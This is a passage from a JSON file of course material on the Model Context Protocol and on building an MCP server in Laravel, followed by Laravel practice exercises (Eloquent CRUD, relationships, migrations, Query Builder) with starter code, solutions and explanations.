inputSchema.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStep 2 — Invoke a tool.\u003c/strong\u003e Client sends \u003ccode\u003e{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;tools/call&quot;,&quot;params&quot;:{&quot;name&quot;:&quot;AddTodoTool&quot;,&quot;arguments&quot;:{&quot;title&quot;:&quot;Buy milk&quot;}},&quot;id&quot;:2}\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStep 3 — Receive the result.\u003c/strong\u003e Server executes the tool&#39;s \u003ccode\u003ehandle()\u003c/code\u003e method and returns \u003ccode\u003e{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;result&quot;:{&quot;id&quot;:42,&quot;title&quot;:&quot;Buy milk&quot;},&quot;id&quot;:2}\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eThe same envelope format applies whether the transport is STDIO or SSE.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h2","html":"MCP composability","text":"MCP composability"},{"kind":"p","html":"\u003cstrong\u003eMCP composability\u003c/strong\u003e is the protocol property that allows a node to act as a client \u003cem\u003eand\u003c/em\u003e a server simultaneously. One agent can consume another agent&#39;s server while itself being callable by a higher-level orchestrator.","text":"**MCP composability** is the protocol property that allows a node to act as a client *and* a server simultaneously. One agent can consume another agent's server while itself being callable by a higher-level orchestrator."},{"kind":"mermaid","source":"graph LR\n  U[User + LLM] -- client --\u003e S1[Agent A\\nclient+server]\n  S1 -- client --\u003e S2[Agent B\\nclient+server]\n  S2 -- client --\u003e S3[Agent C\\nserver]"},{"kind":"p","html":"This enables chained / nested agent architectures without custom glue code. Each hop still speaks JSON-RPC 2.0 over STDIO or SSE.","text":"This enables chained / nested agent architectures without custom glue code. Each hop still speaks JSON-RPC 2.0 over STDIO or SSE."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Tools (MCP), Resources (MCP), and Prompts (MCP) serve different purposes. Tools execute actions with side effects. Resources expose read-only data. Prompts are reusable LLM templates. Conflating Tools with Resources was a distractor pattern on the past exam.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eModel Context Protocol gives every AI model a single, stable handshake for discovering and invoking external capabilities. The three primitives — Tools (MCP), Resources (MCP), and Prompts (MCP) — cover actions, data, and templates respectively. JSON-RPC 2.0 over STDIO or SSE is the transport layer. MCP composability lets clients become servers, enabling multi-agent pipelines without custom integration per hop.\u003c/p\u003e","text":"Model Context Protocol gives every AI model a single, stable handshake for discovering and invoking external capabilities. The three primitives — Tools (MCP), Resources (MCP), and Prompts (MCP) — cover actions, data, and templates respectively. JSON-RPC 2.0 over STDIO or SSE is the transport layer. MCP composability lets clients become servers, enabling multi-agent pipelines without custom integration per hop."}]},{"n":17,"id":"laravel-mcp-implementation","title":"Building an MCP server in Laravel","hook":"Your Laravel app can expose tools that Claude calls — not just call tools itself.","tags":["mcp","laravel","sse","stdio","json-rpc","server-side"],"module":"mcp-module","source":"laravel_mcp.pptx slides 1–12","blocks":[{"kind":"h2","html":"Client or server — which side are you on?","text":"Client or server — which side are you on?"},{"kind":"p","html":"Imagine your Laravel app already calls an external MCP server to fetch weather data. That makes Laravel an MCP \u003cstrong\u003eclient\u003c/strong\u003e. Now a different question: what if you want Claude to call \u003cem\u003eyour\u003c/em\u003e Laravel app — to let Claude create a todo, query your database, or trigger a workflow you own?","text":"Imagine your Laravel app already calls an external MCP server to fetch weather data. That makes Laravel an MCP **client**. Now a different question: what if you want Claude to call *your* Laravel app — to let Claude create a todo, query your database, or trigger a workflow you own?"},{"kind":"p","html":"For that, Laravel must become an MCP \u003cstrong\u003eserver\u003c/strong\u003e.","text":"For that, Laravel must become an MCP **server**."},{"kind":"checkpoint","q":"What does a Laravel app need to do to act as an MCP server rather than an MCP client?","a":"It must expose endpoints that respond to `tools/list` and `tools/call` requests in the JSON-RPC 2.0 format — declaring what tools exist and executing them when invoked."},{"kind":"p","html":"The distinction matters because the responsibilities are opposite. A client discovers and calls tools. A server advertises and executes them.","text":"The distinction matters because the responsibilities are opposite. A client discovers and calls tools. A server advertises and executes them."},{"kind":"h2","html":"What the server must expose","text":"What the server must expose"},{"kind":"p","html":"An MCP server has two required endpoints, both speaking JSON-RPC 2.0:","text":"An MCP server has two required endpoints, both speaking JSON-RPC 2.0:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003etools/list\u003c/code\u003e\u003c/strong\u003e — returns an array of tool definitions so any MCP client can discover what the server can do.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003etools/call\u003c/code\u003e\u003c/strong\u003e — accepts a tool name and arguments, executes the tool, and returns the result.\u003c/li\u003e\n\u003c/ul\u003e","text":"- **`tools/list`** — returns an array of tool definitions so any MCP client can discover what the server can do.\n- **`tools/call`** — accepts a tool name and arguments, executes the tool, and returns the result."},{"kind":"p","html":"Every tool definition has exactly three fields:","text":"Every tool definition has exactly three fields:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eField\u003c/th\u003e\n\u003cth\u003eType\u003c/th\u003e\n\u003cth\u003ePurpose\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ename\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003eUnique identifier the client uses when calling\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003edescription\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003eNatural-language explanation; the LLM reads this to decide when to call\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003einputSchema\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eJSON Schema object\u003c/td\u003e\n\u003ctd\u003eDeclares the shape and types of the arguments\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"The \u003ccode\u003edescription\u003c/code\u003e field is load-bearing. Claude decides \u003cem\u003ewhether\u003c/em\u003e to call your tool based on it. A vague description produces missed invocations or wrong invocations.","text":"The `description` field is load-bearing. Claude decides *whether* to call your tool based on it. A vague description produces missed invocations or wrong invocations."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eWriting \u003ccode\u003edescription: &quot;Adds a todo&quot;\u003c/code\u003e is not enough. Claude needs context: what kind of todo, what system it goes into, what the return value means. A description like \u003ccode\u003e&quot;Creates a new todo item in the app&#39;s task list and returns the created item&#39;s ID&quot;\u003c/code\u003e gives Claude the signal it needs to invoke correctly.\u003c/p\u003e","text":"Writing `description: \"Adds a todo\"` is not enough. Claude needs context: what kind of todo, what system it goes into, what the return value means. A description like `\"Creates a new todo item in the app's task list and returns the created item's ID\"` gives Claude the signal it needs to invoke correctly."},{"kind":"h2","html":"Setting up the Laravel MCP package","text":"Setting up the Laravel MCP package"},{"kind":"p","html":"Laravel&#39;s first-party MCP package installs via Composer and adds two Artisan generators:","text":"Laravel's first-party MCP package installs via Composer and adds two Artisan generators:"},{"kind":"code","lang":"bash","code":"composer require laravel/mcp\nphp artisan vendor:publish --tag=ai-routes\nphp artisan make:mcp-server TodoServer\nphp artisan make:mcp-tool AddTodoTool"},{"kind":"p","html":"The \u003ccode\u003evendor:publish\u003c/code\u003e step registers the MCP route namespace — the endpoints your server will respond on. Each tool lives in its own class scaffolded by \u003ccode\u003emake:mcp-tool\u003c/code\u003e. The server class (from \u003ccode\u003emake:mcp-server\u003c/code\u003e) registers which tools it exposes.","text":"The `vendor:publish` step registers the MCP route namespace — the endpoints your server will respond on. Each tool lives in its own class scaffolded by `make:mcp-tool`. The server class (from `make:mcp-server`) registers which tools it exposes."},{"kind":"callout","variant":"example","html":"\u003cp\u003e\u003cstrong\u003eStep 1 — Scaffold the server and tool.\u003c/strong\u003e Run \u003ccode\u003ephp artisan make:mcp-server TodoServer\u003c/code\u003e and \u003ccode\u003ephp artisan make:mcp-tool AddTodoTool\u003c/code\u003e. This generates two skeleton classes: \u003ccode\u003eTodoServer\u003c/code\u003e (which declares what tools it exposes) and \u003ccode\u003eAddTodoTool\u003c/code\u003e (which contains the \u003ccode\u003ehandle()\u003c/code\u003e method that executes when called).\n\u003cstrong\u003eStep 2 — Register the tool in the server.\u003c/strong\u003e Inside \u003ccode\u003eTodoServer\u003c/code\u003e, add \u003ccode\u003eAddTodoTool::class\u003c/code\u003e to the server&#39;s tool list. Fill in the \u003ccode\u003ename\u003c/code\u003e, \u003ccode\u003edescription\u003c/code\u003e, and \u003ccode\u003einputSchema\u003c/code\u003e on \u003ccode\u003eAddTodoTool\u003c/code\u003e — the description is what Claude reads to decide whether to invoke the tool.\n\u003cstrong\u003eStep 3 — Test with mcp:inspector.\u003c/strong\u003e Run \u003ccode\u003ephp artisan mcp:inspector mcp/todo\u003c/code\u003e. The inspector opens a local UI where you can send \u003ccode\u003etools/list\u003c/code\u003e to verify your tool appears, then send \u003ccode\u003etools/call\u003c/code\u003e with sample arguments to confirm \u003ccode\u003ehandle()\u003c/code\u003e returns the expected result.\n\u003cstrong\u003eStep 4 — Configure the client.\u003c/strong\u003e Add an entry to your VS Code \u003ccode\u003emcp.json\u003c/code\u003e pointing at \u003ccode\u003ehttp://localhost:8000/mcp/todo\u003c/code\u003e with \u003ccode\u003e&quot;type&quot;: &quot;http&quot;\u003c/code\u003e. Claude (or any MCP client) can now discover and invoke \u003ccode\u003eAddTodoTool\u003c/code\u003e without any custom integration code.\u003c/p\u003e","text":"**Step 1 — Scaffold the server and tool.** Run `php artisan make:mcp-server TodoServer` and `php artisan make:mcp-tool AddTodoTool`. This generates two skeleton classes: `TodoServer` (which declares what tools it exposes) and `AddTodoTool` (which contains the `handle()` method that executes when called).\n**Step 2 — Register the tool in the server.** Inside `TodoServer`, add `AddTodoTool::class` to the server's tool list. Fill in the `name`, `description`, and `inputSchema` on `AddTodoTool` — the description is what Claude reads to decide whether to invoke the tool.\n**Step 3 — Test with mcp:inspector.** Run `php artisan mcp:inspector mcp/todo`. The inspector opens a local UI where you can send `tools/list` to verify your tool appears, then send `tools/call` with sample arguments to confirm `handle()` returns the expected result.\n**Step 4 — Configure the client.** Add an entry to your VS Code `mcp.json` pointing at `http://localhost:8000/mcp/todo` with `\"type\": \"http\"`. Claude (or any MCP client) can now discover and invoke `AddTodoTool` without any custom integration code."},{"kind":"h2","html":"Transport: SSE vs STDIO","text":"Transport: SSE vs STDIO"},{"kind":"p","html":"Two transport mechanisms exist for MCP servers. The choice depends on where the server runs.","text":"Two transport mechanisms exist for MCP servers. The choice depends on where the server runs."},{"kind":"p","html":"\u003cstrong\u003eSSE (Server-Sent Events)\u003c/strong\u003e is for remote servers accessible over HTTP. The client opens a persistent HTTP connection and the server streams messages back. Your VS Code \u003ccode\u003emcp.json\u003c/code\u003e uses SSE when it points to a URL:","text":"**SSE (Server-Sent Events)** is for remote servers accessible over HTTP. The client opens a persistent HTTP connection and the server streams messages back. Your VS Code `mcp.json` uses SSE when it points to a URL:"},{"kind":"code","lang":"json","code":"{\n  \"servers\": {\n    \"todo-mcp-server\": {\n      \"url\": \"http://localhost:8000/mcp/todo\",\n      \"type\": \"http\"\n    }\n  }\n}"},{"kind":"p","html":"\u003cstrong\u003eSTDIO\u003c/strong\u003e is for local process-based servers. The client spawns a subprocess and communicates over standard input/output pipes. This requires no HTTP server — the MCP client directly manages the process lifecycle.","text":"**STDIO** is for local process-based servers. The client spawns a subprocess and communicates over standard input/output pipes. This requires no HTTP server — the MCP client directly manages the process lifecycle."},{"kind":"p","html":"For a Laravel app deployed to a URL, SSE is the correct transport. STDIO applies to command-line tools or local scripts, not web frameworks.","text":"For a Laravel app deployed to a URL, SSE is the correct transport. STDIO applies to command-line tools or local scripts, not web frameworks."},{"kind":"checkpoint","q":"A team wants to deploy their MCP server to Azure App Service and connect Claude Desktop to it. Which transport applies?","a":"SSE — the server is remote and HTTP-accessible. STDIO only applies to locally-spawned processes."},{"kind":"h2","html":"MCP inspector for local testing","text":"MCP inspector for local testing"},{"kind":"p","html":"The package ships a built-in inspector command:","text":"The package ships a built-in inspector command:"},{"kind":"code","lang":"bash","code":"php artisan mcp:inspector mcp/todo"},{"kind":"p","html":"This opens a local UI to send \u003ccode\u003etools/list\u003c/code\u003e and \u003ccode\u003etools/call\u003c/code\u003e requests to your server manually — equivalent to Postman for MCP endpoints. Use it before connecting any real MCP client.","text":"This opens a local UI to send `tools/list` and `tools/call` requests to your server manually — equivalent to Postman for MCP endpoints. Use it before connecting any real MCP client."},{"kind":"h2","html":"Composability: client and server at once","text":"Composability: client and server at once"},{"kind":"p","html":"A single Laravel app can act as both an MCP client (calling external tools) and an MCP server (exposing tools to Claude). The two roles are independent. One controller can call an external weather MCP server; a separate MCP server class in the same app can expose a \u003ccode\u003eCreateInvoice\u003c/code\u003e tool to Claude.","text":"A single Laravel app can act as both an MCP client (calling external tools) and an MCP server (exposing tools to Claude). The two roles are independent. One controller can call an external weather MCP server; a separate MCP server class in the same app can expose a `CreateInvoice` tool to Claude."},{"kind":"p","html":"This composability is what makes MCP-based agent architectures scalable. Each service owns its domain and exposes it as callable tools, while also being free to consume tools from other services.","text":"This composability is what makes MCP-based agent architectures scalable. Each service owns its domain and exposes it as callable tools, while also being free to consume tools from other services."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eDo not confuse the app&#39;s own MCP server route with external MCP server URLs. The local \u003ccode\u003emcp/todo\u003c/code\u003e path is your server&#39;s endpoint. Any external MCP server has a completely separate URL and requires its own client configuration.\u003c/p\u003e","text":"Do not confuse the app's own MCP server route with external MCP server URLs. The local `mcp/todo` path is your server's endpoint. Any external MCP server has a completely separate URL and requires its own client configuration."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eBuilding an MCP server in Laravel means registering tool definitions — each with \u003ccode\u003ename\u003c/code\u003e, \u003ccode\u003edescription\u003c/code\u003e, and \u003ccode\u003einputSchema\u003c/code\u003e — and wiring two JSON-RPC 2.0 endpoints. The transport you choose (SSE for remote, STDIO for local processes) determines how clients connect. Once deployed, Claude can discover and call your tools the same way it calls any other MCP server.\u003c/p\u003e","text":"Building an MCP server in Laravel means registering tool definitions — each with `name`, `description`, and `inputSchema` — and wiring two JSON-RPC 2.0 endpoints. The transport you choose (SSE for remote, STDIO for local processes) determines how clients connect. Once deployed, Claude can discover and call your tools the same way it calls any other MCP server."}]}],"practice":[{"kind":"code","variant":"starter-solution","n":1,"id":"eloquent-orm-crud","title":"Eloquent ORM — CRUD operations","lang":"php","tags":["eloquent","crud","laravel"],"source":"laravel_with_sqlite_API_SCRIPT.docx","prompt_html":"\u003cp\u003eA \u003ccode\u003eStudent\u003c/code\u003e model maps to a \u003ccode\u003estudents\u003c/code\u003e table with columns \u003ccode\u003eid\u003c/code\u003e, \u003ccode\u003eFirstName\u003c/code\u003e, \u003ccode\u003eLastName\u003c/code\u003e, \u003ccode\u003eSchool\u003c/code\u003e, \u003ccode\u003ecreated_at\u003c/code\u003e, and \u003ccode\u003eupdated_at\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eImplement an API controller&#39;s four core methods using Eloquent ORM:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eindex()\u003c/code\u003e — return all students.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003estore(Request $request)\u003c/code\u003e — validate the three required fields, then insert a new student and return it with HTTP 201.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eshow($id)\u003c/code\u003e — return the student or a JSON 404 message if not found.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edestroy($id)\u003c/code\u003e — delete the student or return a JSON 404 message if not found.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe \u003ccode\u003eStudent\u003c/code\u003e model already has \u003ccode\u003e$fillable\u003c/code\u003e defined for the three fields.\u003c/p\u003e","starter":"\u003c?php\n\nnamespace App\\Http\\Controllers\\api;\n\nuse App\\Http\\Controllers\\Controller;\nuse App\\Models\\Student;\nuse Illuminate\\Http\\Request;\n\nclass StudentsController extends Controller\n{\n    public function index()\n    {\n        // TODO: return all students\n    }\n\n    public function store(Request $request)\n    {\n        // TODO: validate FirstName, LastName, School (all required)\n        // TODO: create and return student with HTTP 201\n    }\n\n    public function show($id)\n    {\n        // TODO: find student; return JSON 404 message if not found\n    }\n\n    public function destroy($id)\n    {\n        // TODO: find student; return JSON 404 message if not found\n        // TODO: delete and return success flag\n    }\n}","solution":"\u003c?php\n\nnamespace App\\Http\\Controllers\\api;\n\nuse App\\Http\\Controllers\\Controller;\nuse App\\Models\\Student;\nuse Illuminate\\Http\\Request;\n\nclass StudentsController extends Controller\n{\n    public function index()\n    {\n        return Student::all();\n    }\n\n    public function store(Request $request)\n    {\n        request()-\u003evalidate([\n            'FirstName' =\u003e 'required',\n            'LastName'  =\u003e 'required',\n            'School'    =\u003e 'required',\n        ]);\n\n        $student = Student::create([\n            'FirstName' =\u003e request('FirstName'),\n            'LastName'  =\u003e request('LastName'),\n            'School'    =\u003e request('School'),\n        ]);\n\n        return response()-\u003ejson($student, 201);\n    }\n\n    public function show($id)\n    {\n        $student = Student::find($id);\n\n        if (!$student) {\n            return response()-\u003ejson(['message' =\u003e 'Student not found'], 404);\n        }\n\n        return response()-\u003ejson($student);\n    }\n\n    public function destroy($id)\n    {\n        $student = Student::find($id);\n\n        if (!$student) {\n            return response()-\u003ejson(['message' =\u003e 'Student not found'], 404);\n        }\n\n        $isSuccess = $student-\u003edelete();\n\n        return response()-\u003ejson(['success' =\u003e $isSuccess]);\n    }\n}","why_html":"\u003cp\u003e\u003ccode\u003eStudent::all()\u003c/code\u003e returns every row as an Eloquent Collection. Laravel automatically serializes it to JSON when returned from a controller, so \u003ccode\u003eindex()\u003c/code\u003e needs no extra wrapping.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eStudent::create()\u003c/code\u003e requires the \u003ccode\u003e$fillable\u003c/code\u003e array on the model. Without it, Laravel throws a \u003ccode\u003eMassAssignmentException\u003c/code\u003e even when your fields look safe — the protection is unconditional. The \u003ccode\u003estore()\u003c/code\u003e method validates first so invalid input never reaches \u003ccode\u003ecreate()\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eshow()\u003c/code\u003e and \u003ccode\u003edestroy()\u003c/code\u003e use \u003ccode\u003eStudent::find($id)\u003c/code\u003e rather than \u003ccode\u003efindOrFail()\u003c/code\u003e because an API endpoint should return a JSON error body, not Laravel&#39;s HTML 404 page. \u003ccode\u003efindOrFail()\u003c/code\u003e is the correct choice for web controllers where Laravel&#39;s exception-to-HTML mapping is acceptable; for JSON APIs, check for \u003ccode\u003enull\u003c/code\u003e manually and return \u003ccode\u003eresponse()-&gt;json([&#39;message&#39; =&gt; &#39;...&#39;], 404)\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eTwo common wrong approaches: (1) using \u003ccode\u003eStudent::all()\u003c/code\u003e in \u003ccode\u003eindex()\u003c/code\u003e and then chaining \u003ccode\u003e-&gt;where()\u003c/code\u003e — \u003ccode\u003eall()\u003c/code\u003e loads the full table into PHP memory before any filter runs; (2) forgetting \u003ccode\u003e$fillable\u003c/code\u003e and wondering why \u003ccode\u003ecreate()\u003c/code\u003e silently fails or throws — the model must declare the whitelist before mass assignment works.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":2,"id":"model-relationships-hasmanybelongs","title":"Eloquent hasMany / belongsTo","lang":"php","tags":["eloquent","relationships","laravel"],"source":"laravel_with_students_MySQL_SCRIPT.docx; auth-with-breeze_SQLite_SCRIPT.docx","prompt_html":"\u003cp\u003eA \u003ccode\u003eusers\u003c/code\u003e table and an \u003ccode\u003eorgs\u003c/code\u003e table exist. The \u003ccode\u003eorgs\u003c/code\u003e table has a \u003ccode\u003euser_id\u003c/code\u003e foreign key.\u003c/p\u003e\n\u003cp\u003eComplete the following tasks:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eAdd \u003ccode\u003ehasMany\u003c/code\u003e on \u003ccode\u003eUser\u003c/code\u003e so that \u003ccode\u003eAuth::user()-&gt;orgs()\u003c/code\u003e works.\u003c/li\u003e\n\u003cli\u003eAdd \u003ccode\u003ebelongsTo\u003c/code\u003e on \u003ccode\u003eOrg\u003c/code\u003e so that \u003ccode\u003e$org-&gt;user\u003c/code\u003e works.\u003c/li\u003e\n\u003cli\u003eIn \u003ccode\u003eOrgController::index()\u003c/code\u003e, use \u003ccode\u003ewhereBelongsTo()\u003c/code\u003e to fetch only the current user&#39;s orgs, ordered by most recently updated.\u003c/li\u003e\n\u003cli\u003eIn \u003ccode\u003eOrgController::show()\u003c/code\u003e, abort with 403 if the org does not belong to the current user.\u003c/li\u003e\n\u003c/ol\u003e","starter":"\u003c?php\n// app/Models/User.php (partial)\nclass User extends Authenticatable\n{\n    // Task 1: declare hasMany relationship\n}\n\n// app/Models/Org.php (partial)\nclass Org extends Model\n{\n    protected $fillable = [\n        'orgName', 'orgType', 'street', 'city',\n        'postalCode', 'province', 'country', 'phone', 'email',\n    ];\n\n    // Task 2: declare belongsTo relationship\n}\n\n// app/Http/Controllers/OrgController.php (partial)\nuse App\\Models\\Org;\nuse Illuminate\\Support\\Facades\\Auth;\n\nclass OrgController extends Controller\n{\n    public function index()\n    {\n        // Task 3: fetch current user's orgs using whereBelongsTo(),\n        //         ordered by latest updated_at\n        $orgs = /* your code here */;\n        return view('orgs.index', ['orgs' =\u003e $orgs]);\n    }\n\n    public function show(Org $org)\n    {\n        // Task 4: abort(403) if org does not belong to Auth::user()\n        return view('orgs.show')-\u003ewith('org', $org);\n    }\n}","solution":"\u003c?php\n// app/Models/User.php (partial)\nclass User extends Authenticatable\n{\n    public function orgs()\n    {\n        return $this-\u003ehasMany(Org::class);\n    }\n}\n\n// app/Models/Org.php (partial)\nclass Org extends Model\n{\n    protected $fillable = [\n        'orgName', 'orgType', 'street', 'city',\n        'postalCode', 'province', 'country', 'phone', 'email',\n    ];\n\n    public function user()\n    {\n        return $this-\u003ebelongsTo(User::class);\n    }\n}\n\n// app/Http/Controllers/OrgController.php (partial)\nuse App\\Models\\Org;\nuse Illuminate\\Support\\Facades\\Auth;\n\nclass OrgController extends Controller\n{\n    public function index()\n    {\n        $orgs = Org::whereBelongsTo(Auth::user())-\u003elatest('updated_at')-\u003eget();\n        return view('orgs.index', ['orgs' =\u003e $orgs]);\n    }\n\n    public function show(Org $org)\n    {\n        if (!$org-\u003euser-\u003eis(Auth::user())) {\n            return abort(403);\n        }\n        return view('orgs.show')-\u003ewith('org', $org);\n    }\n}","why_html":"\u003cp\u003eTwo common wrong approaches appear here. First, developers often put \u003ccode\u003ehasMany\u003c/code\u003e on the wrong model — placing it on \u003ccode\u003eOrg\u003c/code\u003e instead of \u003ccode\u003eUser\u003c/code\u003e. The \u003ccode\u003ehasMany\u003c/code\u003e always goes on the model whose primary key is referenced by the foreign key; \u003ccode\u003eUser\u003c/code\u003e owns the \u003ccode\u003euser_id\u003c/code\u003e on \u003ccode\u003eorgs\u003c/code\u003e, so \u003ccode\u003ehasMany\u003c/code\u003e belongs on \u003ccode\u003eUser\u003c/code\u003e. Second, developers forget to call the relationship as a method (\u003ccode\u003eorgs()\u003c/code\u003e with parentheses) when chaining query constraints. Writing \u003ccode\u003eAuth::user()-&gt;orgs-&gt;latest(...)\u003c/code\u003e accesses the property form (a cached collection) and the subsequent \u003ccode\u003e-&gt;latest()\u003c/code\u003e chain call fails with a fatal error. Always use parentheses when you intend to build a query.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":3,"id":"migrations-and-seeders-create","title":"Create a migration and seeder","lang":"php","tags":["laravel","migrations","seeders","database-schema"],"source":"laravel_with_students_MySQL_SCRIPT.docx","prompt_html":"\u003cp\u003eYou are building a \u003ccode\u003ebooks\u003c/code\u003e table. The table needs three string columns — \u003ccode\u003etitle\u003c/code\u003e, \u003ccode\u003eauthor\u003c/code\u003e, and \u003ccode\u003egenre\u003c/code\u003e — plus the standard \u003ccode\u003eid\u003c/code\u003e and timestamps.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eComplete the migration&#39;s \u003ccode\u003eup()\u003c/code\u003e method to create the \u003ccode\u003ebooks\u003c/code\u003e table with those columns.\u003c/li\u003e\n\u003cli\u003eComplete the seeder&#39;s \u003ccode\u003erun()\u003c/code\u003e method to insert one sample book row.\u003c/li\u003e\n\u003c/ol\u003e","starter":"\u003c?php\n// --- Migration: database/migrations/xxxx_create_books_table.php ---\n\nuse Illuminate\\Database\\Migrations\\Migration;\nuse Illuminate\\Database\\Schema\\Blueprint;\nuse Illuminate\\Support\\Facades\\Schema;\n\nreturn new class extends Migration\n{\n    public function up()\n    {\n        Schema::create('books', function (Blueprint $table) {\n            $table-\u003eid();\n            // TODO: add title, author, genre columns\n            $table-\u003etimestamps();\n        });\n    }\n\n    public function down()\n    {\n        Schema::dropIfExists('books');\n    }\n};\n\n// --- Seeder: database/seeders/BookSeeder.php ---\n\nnamespace Database\\Seeders;\n\nuse Illuminate\\Database\\Seeder;\n\nclass BookSeeder extends Seeder\n{\n    public function run(): void\n    {\n        // TODO: insert one Book row with title, author, genre\n    }\n}","solution":"\u003c?php\n// --- Migration: database/migrations/xxxx_create_books_table.php ---\n\nuse Illuminate\\Database\\Migrations\\Migration;\nuse Illuminate\\Database\\Schema\\Blueprint;\nuse Illuminate\\Support\\Facades\\Schema;\n\nreturn new class extends Migration\n{\n    public function up()\n    {\n        Schema::create('books', function (Blueprint $table) {\n            $table-\u003eid();\n            $table-\u003estring('title');\n            $table-\u003estring('author');\n            $table-\u003estring('genre');\n            $table-\u003etimestamps();\n        });\n    }\n\n    public function down()\n    {\n        Schema::dropIfExists('books');\n    }\n};\n\n// --- Seeder: database/seeders/BookSeeder.php ---\n\nnamespace Database\\Seeders;\n\nuse Illuminate\\Database\\Seeder;\n\nclass BookSeeder extends Seeder\n{\n    public function run(): void\n    {\n        $b1 = new \\App\\Models\\Book([\n            'title'  =\u003e 'The Great Gatsby',\n            'author' =\u003e 'F. Scott Fitzgerald',\n            'genre'  =\u003e 'Fiction'\n        ]);\n        $b1-\u003esave();\n    }\n}","why_html":"\u003cp\u003e\u003ccode\u003e$table-&gt;string(&#39;title&#39;)\u003c/code\u003e creates a \u003ccode\u003eVARCHAR(255)\u003c/code\u003e column named \u003ccode\u003etitle\u003c/code\u003e. You add one call per column you need. The \u003ccode\u003e$table-&gt;id()\u003c/code\u003e and \u003ccode\u003e$table-&gt;timestamps()\u003c/code\u003e lines are always present in the scaffold — you only add your domain columns between them.\u003c/p\u003e\n\u003cp\u003eThe seeder passes the column values as an associative array to \u003ccode\u003enew \\App\\Models\\Book([...])\u003c/code\u003e, then calls \u003ccode\u003esave()\u003c/code\u003e to persist the row. The \u003ccode\u003eBook\u003c/code\u003e model must have a \u003ccode\u003e$fillable\u003c/code\u003e array listing \u003ccode\u003etitle\u003c/code\u003e, \u003ccode\u003eauthor\u003c/code\u003e, and \u003ccode\u003egenre\u003c/code\u003e, or the mass assignment will throw an exception.\u003c/p\u003e\n\u003cp\u003eA common wrong approach is calling \u003ccode\u003eSchema::table(&#39;books&#39;, ...)\u003c/code\u003e instead of \u003ccode\u003eSchema::create(&#39;books&#39;, ...)\u003c/code\u003e. Use \u003ccode\u003ecreate\u003c/code\u003e when the table does not exist yet; use \u003ccode\u003etable\u003c/code\u003e only when altering an existing table.\u003c/p\u003e\n\u003cp\u003eTo apply the migration and seed in one step:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003ephp artisan migrate:refresh --seed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRegister \u003ccode\u003eBookSeeder\u003c/code\u003e in \u003ccode\u003eDatabaseSeeder::run()\u003c/code\u003e first, or the seeder never fires.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":4,"id":"query-builder-patterns","title":"Query Builder — filtering and ordering","lang":"php","tags":["laravel","query-builder"],"source":"TIDBITS-components_config_db_SCRIPT.docx","prompt_html":"\u003cp\u003eUsing the Query Builder facade, query the \u003ccode\u003estudents\u003c/code\u003e table. Select the \u003ccode\u003eFirstName\u003c/code\u003e, \u003ccode\u003eLastName\u003c/code\u003e, and \u003ccode\u003eSchool\u003c/code\u003e columns. Exclude rows where \u003ccode\u003eSchool\u003c/code\u003e is NULL. Sort results by \u003ccode\u003eFirstName\u003c/code\u003e ascending. Return the collection.\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eDB\u003c/code\u003e facade is already imported. Do not use Eloquent or raw SQL.\u003c/p\u003e","starter":"use Illuminate\\Support\\Facades\\DB;\n\npublic function qbuilder() {\n    $students = DB::table('students')\n        // your chain here\n        ;\n\n    dd($students);\n}","solution":"use Illuminate\\Support\\Facades\\DB;\n\npublic function qbuilder() {\n    $students = DB::table('students')\n        -\u003eselect(['FirstName', 'LastName', 'School'])\n        -\u003ewhereNotNull('School')\n        -\u003eorderBy('FirstName')\n        -\u003eget();\n\n    dd($students);\n}","why_html":"\u003cp\u003e\u003ccode\u003eDB::table(&#39;students&#39;)\u003c/code\u003e opens the Query Builder on the \u003ccode\u003estudents\u003c/code\u003e table. \u003ccode\u003e-&gt;select([...])\u003c/code\u003e restricts which columns are fetched — passing an array of column names. 